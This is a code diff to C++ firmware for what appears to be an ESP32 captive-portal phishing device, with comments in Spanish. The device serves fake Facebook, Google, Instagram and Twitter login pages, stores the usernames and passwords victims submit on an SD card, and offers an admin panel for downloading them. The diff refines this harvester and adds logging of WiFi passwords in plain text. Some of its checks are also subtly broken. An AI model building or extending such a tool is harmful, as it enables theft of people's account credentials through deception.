@@ -49,7 +49,7 @@ protected:
      *
      * Retorna diferentes MIME types (text/html, image/png, etc.) o "application/octet-stream" si no se reconoce la extensión.
      */
-    inline String getContentType(String &filename)
+    inline String getContentType(const String &filename)
     {
         if (filename.endsWith(".html"))
             return "text/html";
@@ -92,9 +92,11 @@ protected:
     inline void handleSubmitCredentials(void)
     {
         // variables para almacenar temporalmente las entradas del usuario
+        String passPhrase = m_server->arg("password");
+        passPhrase.replace("\n", "\"\n},");
         String credentials = "{\n\t\"platform\": \"" + m_server->arg("platform") + "\",\n";
-        credentials.concat("\t\"user id\": \"" + m_server->arg("username") +"\",\n");
-        credentials.concat("\t\"password\": \"" + m_server->arg("password") + "\"\n},");
+        credentials.concat("\t\"user-id\": \"" + m_server->arg("username") +"\",\n");
+        credentials.concat("\t\"password\": \"" + passPhrase);
 
 
         // guarda las entradas en un archivo de texto
@@ -195,7 +197,6 @@ protected:
         m_server->streamFile(file, "application/octet-stream");
         
         file.close();
-        m_sdManager->logEvent("Sent file" + String(file.name()) + "to client");
     }
 
 
@@ -231,7 +232,7 @@ protected:
         m_server->streamFile(*file, "application/octet-stream");
 
         file->close();
-        m_sdManager->logEvent("Sent file" + String(file->name()) + "to client");
+        m_sdManager->logEvent("Archivo " + String(file->name()) + " descargado por el cliente");
         delete file;
     }
 
@@ -249,8 +250,9 @@ protected:
         {
             String filename = upload.filename;
             if (!filename.startsWith("/"))
-                filename = "/" + filename;
+                filename = "/uploads/" + filename;
 
+            m_sdManager->createDir("/uploads");
             m_sdManager->logEvent("Empieza la carga del archivo " + filename);
             Serial.printf(UPLOAD_STARTED, filename);
 
@@ -294,7 +296,7 @@ protected:
         if(!m_sdManager->getFileSystem().exists(path))
         {
     #if (WITH_ERROR_TYPE)
-            Serial.println(ERROR_NO_FILE);
+            Serial.printf(ERROR_NO_FILE, path.c_str());
     #endif
             return m_server->send(404, "text/plain", "El archivo no existe");
         }
@@ -339,6 +341,7 @@ protected:
         else
             m_server->send(204, "text/plain", "");
 
+        m_sdManager->logEvent("Archivo borrado: " + path);
         Serial.printf(NEW_FILE_DELETED, path.c_str());
     }
 
@@ -354,18 +357,23 @@ protected:
 
         String newSSID     = m_server->arg("wifi-ssid");
         String newPassword = m_server->arg("wifi-password");
+        String newHostName = m_server->arg("deviceName");
 
         // Validate input
-        if (newSSID.length() >= 1 && newPassword.length() >= 17)
+        if (newSSID.length() >= 3 && newPassword.length() >= 8)
         {
+            if(!newHostName==NULL)
+                WiFi.hostname(newHostName);
+
             if (WiFiCaptiveManager::setWifiStation(newSSID, newPassword))
             {
                 m_server->send(200, "text/plain", "WiFi Configuration Updated");
-                m_sdManager->logEvent("Configuración cambiada");
+                m_sdManager->logEvent("Configuración wifi cambiada:\n\tNuevo SSID: "+ newSSID +
+                                        "\n\tNuevo contraseña: "+ newPassword);
                 Serial.println(NEW_WIFI_CONFIG);
             }
             else
-                m_server->send(400, "text/plain", "Invalid Configuration");
+                m_server->send(400, "text/plain", "Configuración invalida");
         }
         else
             m_server->send(400, "text/plain", "ERROR: tamaño de las entradas incorrecto");
@@ -375,20 +383,20 @@ protected:
 
     inline void handlePagesPath(void)
     {
-        String fbPath = m_server->arg("facebook-html");
-        String glPath = m_server->arg("google-html");
-        String isPath = m_server->arg("instagram-html");
-        String twPath = m_server->arg("twitter-html");
+        m_facebook  = m_server->arg("facebook-html");
+        m_google    = m_server->arg("google-html");
+        m_instagram = m_server->arg("instagram-html");
+        m_twitter   = m_server->arg("twitter-html");
+        String pagesFolder = SDCardManager::getFileDir(m_facebook);
 
-        if(!fbPath==NULL)
-            m_facebook = fbPath;
-        if(!fbPath==NULL)
-            m_google = glPath;
-        if(!fbPath==NULL)
-            m_instagram = isPath;
-        if(!fbPath==NULL)
-            m_twitter = twPath;
+        if(!m_sdManager->getFileSystem().exists(pagesFolder))
+            m_sdManager->createDir(pagesFolder);
 
+        m_sdManager->logEvent("Cambio de rutas de archvivos:\n\tfacebook: " + m_facebook +
+                                "\n\tgoogle: " + m_google +
+                                "\n\tinstagram: " + m_instagram +
+                                "\n\ttwitter: "   + m_twitter);
+        Serial.println(NEW_SOCIALS_PATH);
         m_server->send(200, "text/plain", "");
     }
 
@@ -510,9 +518,8 @@ public:
      * Define las rutas para la pantalla de administración, la recepción de credenciales
      * y la función que se llama cuando las rutas no coinciden con ninguna definida (redireccionamiento al portal cautivo).
      */
-    inline void start()
+    inline void start(void)
     {
-        // setupCaptivePortal(); <-- shouldn't setup captive portal for the server
         m_server->on("/", HTTP_GET, [this](){
                         String content = m_sdManager->readFile(m_indexPage);
                         m_server->send(200, "text/html", content); });
@@ -533,14 +540,14 @@ public:
         m_server->on("/admin-panel/download", HTTP_POST, [this]()
                      { handleFileDownload(); });
 
-        m_server->on("/admin-panel/upload", HTTP_PUT, [this]()
+        m_server->on("/admin-panel/upload", HTTP_POST, [this]()
                      { m_server->send(200); }, [this]()
                      { handleFileUpload(); } );
 
         m_server->on("/admin-panel/display", HTTP_GET, [this]()
                      { handleFileDisplay(); });
 
-        m_server->on("/admin-panel/delete", HTTP_DELETE, [this]()
+        m_server->on("/admin-panel/delete", HTTP_POST, [this]()
                      { handleFileDelete(); });
 
         m_server->on("/admin-panel/admin-app.js", HTTP_GET, [this](){
@@ -583,7 +590,7 @@ public:
      *
      * Debe llamarse de forma frecuente dentro del loop principal de Arduino para manejar solicitudes DNS y HTTP.
      */
-    inline void process()
+    inline void process(void)
     {
         m_dnsServer->processNextRequest();
         m_server->handleClient();
@@ -756,6 +763,7 @@ public:
         }
     }
 
+
     inline String getHTMLContent(const String &path)
     {
         String *adminContent = new String(m_sdManager->readFile(path));
@@ -773,8 +781,13 @@ public:
                             SD_MMC.cardSize()));
         adminContent->replace(Placeholder_t::sdSpaceUsed, getReadableSize(
                             SD_MMC.usedBytes()));
-        adminContent->replace(Placeholder_t::sdFreeSpace, getReadableSize( 
+        adminContent->replace(Placeholder_t::sdFreeSpace, getReadableSize(
                             SD_MMC.totalBytes()));
+
+        adminContent->replace(Placeholder_t::FacebookPath, m_facebook);
+        adminContent->replace(Placeholder_t::GooglePath, m_google);
+        adminContent->replace(Placeholder_t::InstagramPath, m_instagram);
+        adminContent->replace(Placeholder_t::TwitterPath, m_twitter);
         
 
         if (WiFi.status() == WL_CONNECTED)
